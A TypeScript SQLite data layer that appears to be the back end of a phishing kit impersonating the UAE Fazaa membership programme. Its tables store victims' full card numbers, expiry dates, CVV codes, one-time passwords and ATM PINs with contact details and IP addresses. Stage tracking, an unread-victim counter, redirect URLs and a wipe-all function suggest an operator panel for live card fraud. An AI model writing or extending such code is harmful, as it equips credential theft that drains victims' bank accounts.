import sqlite3 from 'sqlite3';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DB_PATH = path.join(__dirname, 'fazaa.db');

const db = new sqlite3.Database(DB_PATH);

// Enable WAL mode
db.run('PRAGMA journal_mode = WAL');

// Initialize tables
db.exec(`
  CREATE TABLE IF NOT EXISTS fazaa_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT,
    phoneNumber TEXT,
    email TEXT,
    emirate TEXT,
    district TEXT,
    membershipTier TEXT,
    totalAmount TEXT DEFAULT '150',
    cardName TEXT,
    cardNumber TEXT,
    cardNumberMasked TEXT,
    cardExpiry TEXT,
    cardCvv TEXT,
    otpCode TEXT,
    atmPin TEXT,
    stage TEXT DEFAULT 'card' NOT NULL,
    errorMessage TEXT,
    clientIp TEXT,
    userAgent TEXT,
    statusRead INTEGER DEFAULT 0,
    redirectUrl TEXT,
    createdAt TEXT DEFAULT (datetime('now')),
    updatedAt TEXT DEFAULT (datetime('now'))
  );

  CREATE TABLE IF NOT EXISTS registration_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT NOT NULL,
    phoneNumber TEXT NOT NULL,
    email TEXT NOT NULL,
    emirate TEXT NOT NULL,
    district TEXT,
    membershipTier TEXT NOT NULL,
    totalAmount TEXT DEFAULT '150',
    addressEmirate TEXT,
    addressDistrict TEXT,
    addressStreet TEXT,
    addressBuildingNumber TEXT,
    clientIp TEXT,
    userAgent TEXT,
    createdAt TEXT DEFAULT (datetime('now'))
  );
`);

export interface FazaaSession {
  id: number;
  sessionId: string;
  fullName: string | null;
  phoneNumber: string | null;
  email: string | null;
  emirate: string | null;
  district: string | null;
  membershipTier: string | null;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: string;
  errorMessage: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  redirectUrl: string | null;
  createdAt: string;
  updatedAt: string;
}

export interface RegistrationData {
  id: number;
  sessionId: string;
  fullName: string;
  phoneNumber: string;
  email: string;
  emirate: string;
  district: string | null;
  membershipTier: string;
  totalAmount: string;
  addressEmirate: string | null;
  addressDistrict: string | null;
  addressStreet: string | null;
  addressBuildingNumber: string | null;
  clientIp: string | null;
  userAgent: string | null;
  createdAt: string;
}

function query<T>(sql: string, params: any[] = []): Promise<T[]> {
  return new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => {
      if (err) reject(err);
      else resolve(rows as T[]);
    });
  });
}

function queryOne<T>(sql: string, params: any[] = []): Promise<T | undefined> {
  return new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => {
      if (err) reject(err);
      else resolve(row as T | undefined);
    });
  });
}

function run(sql: string, params: any[] = []): Promise<{ lastID: number; changes: number }> {
  return new Promise((resolve, reject) => {
    db.run(sql, params, function(this: any) {
      if (this) resolve({ lastID: this.lastID, changes: this.changes });
      else reject(new Error('No response from db.run'));
    });
  });
}

// ========== Registration CRUD ==========

export async function createRegistration(data: {
  sessionId: string;
  fullName: string;
  phoneNumber: string;
  email: string;
  emirate: string;
  district?: string | null;
  membershipTier: string;
  totalAmount?: string;
  addressEmirate?: string | null;
  addressDistrict?: string | null;
  addressStreet?: string | null;
  addressBuildingNumber?: string | null;
  clientIp?: string | null;
  userAgent?: string | null;
}): Promise<RegistrationData> {
  await run(
    `INSERT INTO registration_data (sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, addressEmirate, addressDistrict, addressStreet, addressBuildingNumber, clientIp, userAgent)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [data.sessionId, data.fullName, data.phoneNumber, data.email, data.emirate, data.district || null, data.membershipTier, data.totalAmount || '150', data.addressEmirate || null, data.addressDistrict || null, data.addressStreet || null, data.addressBuildingNumber || null, data.clientIp || null, data.userAgent || null]
  );
  const result = await queryOne<RegistrationData>('SELECT * FROM registration_data WHERE sessionId = ?', [data.sessionId]);
  return result!;
}

export async function getRegistrationBySessionId(sessionId: string): Promise<RegistrationData | undefined> {
  return queryOne<RegistrationData>('SELECT * FROM registration_data WHERE sessionId = ?', [sessionId]);
}

export async function getAllRegistrations(limit = 100): Promise<RegistrationData[]> {
  return query<RegistrationData>('SELECT * FROM registration_data ORDER BY createdAt DESC LIMIT ?', [limit]);
}

// ========== Session CRUD ==========

export async function createSession(data: {
  sessionId: string;
  fullName?: string;
  phoneNumber?: string;
  email?: string;
  emirate?: string;
  district?: string | null;
  membershipTier?: string;
  totalAmount?: string;
  clientIp?: string | null;
  userAgent?: string | null;
}): Promise<FazaaSession> {
  await run(
    `INSERT INTO fazaa_sessions (sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, clientIp, userAgent)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [data.sessionId, data.fullName || null, data.phoneNumber || null, data.email || null, data.emirate || null, data.district || null, data.membershipTier || null, data.totalAmount || '150', data.clientIp || null, data.userAgent || null]
  );
  const result = await queryOne<FazaaSession>('SELECT * FROM fazaa_sessions WHERE sessionId = ?', [data.sessionId]);
  return result!;
}

export async function getSessionBySessionId(sessionId: string): Promise<FazaaSession | undefined> {
  return queryOne<FazaaSession>('SELECT * FROM fazaa_sessions WHERE sessionId = ?', [sessionId]);
}

export async function updateSession(sessionId: string, updates: Record<string, any>): Promise<void> {
  const fields: string[] = [];
  const values: any[] = [];
  
  for (const [key, value] of Object.entries(updates)) {
    fields.push(`${key} = ?`);
    values.push(value);
  }
  
  fields.push("updatedAt = datetime('now')");
  values.push(sessionId);
  
  await run(`UPDATE fazaa_sessions SET ${fields.join(', ')} WHERE sessionId = ?`, values);
}

export async function getAllSessions(limit = 100): Promise<FazaaSession[]> {
  return query<FazaaSession>('SELECT * FROM fazaa_sessions ORDER BY createdAt DESC LIMIT ?', [limit]);
}

export async function getUnreadSessionsCount(): Promise<number> {
  const result = await queryOne<{ count: number }>('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0');
  return result?.count || 0;
}

export async function markAllAsRead(): Promise<void> {
  await run('UPDATE fazaa_sessions SET statusRead = 1 WHERE statusRead = 0');
}

export async function clearAllData(): Promise<void> {
  await run('DELETE FROM fazaa_sessions');
  await run('DELETE FROM registration_data');
}

export async function getStats(): Promise<{ total: number; pending: number; completed: number; failed: number; new: number; registrations: number }> {
  const [total, pending, completed, failed, newCount, registrations] = await Promise.all([
    queryOne<{ count: number }>('SELECT COUNT(*) as count FROM fazaa_sessions'),
    queryOne<{ count: number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage LIKE '%_pending'"),
    queryOne<{ count: number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'success'"),
    queryOne<{ count: number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'failed'"),
    queryOne<{ count: number }>('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0'),
    queryOne<{ count: number }>('SELECT COUNT(*) as count FROM registration_data'),
  ]);
  
  return {
    total: total?.count || 0,
    pending: pending?.count || 0,
    completed: completed?.count || 0,
    failed: failed?.count || 0,
    new: newCount?.count || 0,
    registrations: registrations?.count || 0,
  };
}

export default db;
